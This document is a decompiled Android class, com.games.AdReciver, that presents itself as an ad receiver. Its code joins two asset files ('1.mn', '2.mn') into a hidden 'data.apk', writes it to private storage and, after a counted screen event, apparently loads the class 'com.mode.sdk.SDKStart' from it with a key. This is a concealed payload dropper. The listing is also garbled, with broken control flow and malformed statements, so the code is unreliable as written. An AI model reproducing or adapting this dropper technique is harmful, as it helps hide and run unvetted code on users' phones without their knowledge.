public class com.games.AdReciver extends android.content.BroadcastReceiver {
	 /* # direct methods */
	 public com.games.AdReciver ( ) {
		 /* .locals 0 */
		 /* invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V */
		 return;
	 } // .end method
	 /* # virtual methods */
	 public void a ( android.content.Context p0 ) {
		 /* .locals 8 */
		 /* const v7, 0x1fcd9 */
		 /* const v6, 0x1fbd0 */
		 int v0 = 0; // const/4 v0, 0x0
		 try { // :try_start_0
			 (( android.content.Context ) p1 ).getAssets ( ); // invoke-virtual {p1}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
			 final String v2 = "1.mn"; // const-string v2, "1.mn"
			 (( android.content.res.AssetManager ) v1 ).open ( v2 ); // invoke-virtual {v1, v2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
			 /* const v2, 0x1fbd0 */
			 /* new-array v2, v2, [B */
			 (( java.io.InputStream ) v1 ).read ( v2 ); // invoke-virtual {v1, v2}, Ljava/io/InputStream;->read([B)I
			 (( android.content.Context ) p1 ).getAssets ( ); // invoke-virtual {p1}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;
			 final String v3 = "2.mn"; // const-string v3, "2.mn"
			 (( android.content.res.AssetManager ) v1 ).open ( v3 ); // invoke-virtual {v1, v3}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
			 /* const v3, 0x1fcd9 */
			 /* new-array v3, v3, [B */
			 (( java.io.InputStream ) v1 ).read ( v3 ); // invoke-virtual {v1, v3}, Ljava/io/InputStream;->read([B)I
			 /* const v1, 0x3f8a9 */
			 /* new-array v4, v1, [B */
			 /* move v1, v0 */
		 } // :goto_0
		 /* if-lt v1, v6, :cond_0 */
	 } // :goto_1
	 /* if-lt v0, v7, :cond_1 */
	 final String v0 = "data.apk"; // const-string v0, "data.apk"
	 int v1 = 0; // const/4 v1, 0x0
	 (( android.content.Context ) p1 ).openFileOutput ( v0, v1 ); // invoke-virtual {p1, v0, v1}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;
	 (( java.io.OutputStream ) v0 ).write ( v4 ); // invoke-virtual {v0, v4}, Ljava/io/OutputStream;->write([B)V
	 (( java.io.OutputStream ) v0 ).flush ( ); // invoke-virtual {v0}, Ljava/io/OutputStream;->flush()V
	 (( java.io.OutputStream ) v0 ).close ( ); // invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
} // :goto_2
return;
} // :cond_0
/* aget-byte v5, v2, v1 */
/* aput-byte v5, v4, v1 */
/* add-int/lit8 v1, v1, 0x1 */
} // :cond_1
/* add-int v1, v6, v0 */
/* aget-byte v2, v3, v0 */
/* aput-byte v2, v4, v1 */
/* :try_end_0 */
/* .catch Ljava/io/IOException; {:try_start_0 ..:try_end_0} :catch_0 */
/* add-int/lit8 v0, v0, 0x1 */
/* :catch_0 */
/* move-exception v0 */
(( java.io.IOException ) v0 ).printStackTrace ( ); // invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V
} // .end method
public void onReceive ( android.content.Context p0, android.content.Intent p1 ) {
/* .locals 8 */
int v7 = 0; // const/4 v7, 0x0
final String v0 = "com.game.param"; // const-string v0, "com.game.param"
(( android.content.Context ) p1 ).getSharedPreferences ( v0, v7 ); // invoke-virtual {p1, v0, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
v0 = final String v0 = "ScreenNumber"; // const-string v0, "ScreenNumber"
/* add-int/lit8 v0, v0, 0x1 */
v1 = java.lang.System.out;
/* new-instance v2, Ljava/lang/StringBuilder; */
final String v3 = "ScreenNumber: "; // const-string v3, "ScreenNumber: "
/* invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
(( java.lang.StringBuilder ) v2 ).append ( v0 ); // invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v2 ).toString ( ); // invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
(( java.io.PrintStream ) v1 ).println ( v2 ); // invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V
int v1 = 2; // const/4 v1, 0x2
/* if-ge v0, v1, :cond_1 */
(( com.games.AdReciver ) p0 ).a ( p1 ); // invoke-virtual {p0, p1}, Lcom/games/AdReciver;->a(Landroid/content/Context;)V
final String v2 = "ScreenNumber"; // const-string v2, "ScreenNumber"
} // :cond_0
} // :goto_0
return;
} // :cond_1
/* new-instance v0, Lcom/games/b; */
/* invoke-direct {v0, p1}, Lcom/games/b;-><init>(Landroid/content/Context;)V */
v0 = this.h;
final String v1 = ""; // const-string v1, ""
v0 = (( java.lang.String ) v0 ).equals ( v1 ); // invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
/* if-nez v0, :cond_0 */
(( android.content.Context ) p1 ).getApplicationInfo ( ); // invoke-virtual {p1}, Landroid/content/Context;->getApplicationInfo()Landroid/content/pm/ApplicationInfo;
v0 = this.dataDir;
/* new-instance v1, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v0 );
/* invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
final String v2 = "/files/data.apk"; // const-string v2, "/files/data.apk"
(( java.lang.StringBuilder ) v1 ).append ( v2 ); // invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v1 ).toString ( ); // invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
/* new-instance v2, Ljava/lang/StringBuilder; */
java.lang.String .valueOf ( v0 );
/* invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V */
final String v0 = "/files"; // const-string v0, "/files"
(( java.lang.StringBuilder ) v2 ).append ( v0 ); // invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
(( java.lang.StringBuilder ) v0 ).toString ( ); // invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
final String v3 = "com.mode.sdk.SDKStart"; // const-string v3, "com.mode.sdk.SDKStart"
final String v4 = "InitStart"; // const-string v4, "InitStart"
final String v5 = "51ad2cccefbc13027745f48ac13641e1"; // const-string v5, "51ad2cccefbc13027745f48ac13641e1"
/* move-object v0, p1 */
/* invoke-static/range {v0 ..v5}, Lcom/games/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V */
final String v1 = "ScreenNumber"; // const-string v1, "ScreenNumber"
} // .end method
